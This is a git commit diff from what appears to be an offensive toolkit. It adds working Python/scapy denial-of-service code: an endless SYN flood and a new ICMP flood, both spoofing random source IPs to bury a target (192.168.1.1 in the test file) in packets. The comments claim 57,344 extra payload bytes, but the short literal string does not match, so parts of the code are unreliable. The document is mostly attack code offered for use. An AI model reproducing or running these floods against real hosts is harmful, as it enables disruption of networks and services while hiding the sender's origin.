aac445b81baa6942ee7f02a5c01df6bf54cac02e
Harrison Thompson Buckley <harrisonthompsonbuckley@protonmail.com>
2022-09-19 15:46:52 +0800

    Altered payload of DoS attacks, added the ICMP flood attack.

--- core/denialOfService/DOS.py
+++ core/denialOfService/DOS.py
@@ -7,19 +7,29 @@ class DOS:
 
     def synFlood(self):   
         while True:
+            # Get new fake IP address for the IP header source field
             fake = Faker()
             fakeIpAddr = fake.ipv4()
             
             packetStack = IP(dst = self.target, src = fakeIpAddr) / TCP(sport = 80, dport = 443, flags = "S")
-            payload = Raw(b"X" * 57344)
+            
+            # 57344 additional bytes
+            payload = Raw(b"abcdefghijklmnopqrstuvwyxzABCDEFGHIJKLMNOPQRSTUVWYXZ1234567890!@#$%^&*()")
             
             payloadPacket = packetStack / payload
 
             send(payloadPacket, verbose = 0)
 
     def icmpFlood(self):
-        print("xx")
+        while True:
+            fake = Faker()
+            fakeIpAddr = fake.ipv4()
 
-a = DOS("192.168.1.1")
+            packetStack = IP(dst = self.target, src = fakeIpAddr) / ICMP()
+            
+            # 57344 additional bytes added
+            payload = Raw(b"abcdefghijklmnopqrstuvwyxzABCDEFGHIJKLMNOPQRSTUVWYXZ1234567890!@#$%^&*()")
 
-a.synFlood()
+            payloadPacket = packetStack / payload
+
+            send(payloadPacket, verbose = 0)
---
+++ core/denialOfService/dosClassTest.py
@@ -0,0 +1,7 @@
+from DOS import DOS
+
+a = DOS("192.168.1.1")
+
+#a.synFlood()
+
+#a.icmpFlood()
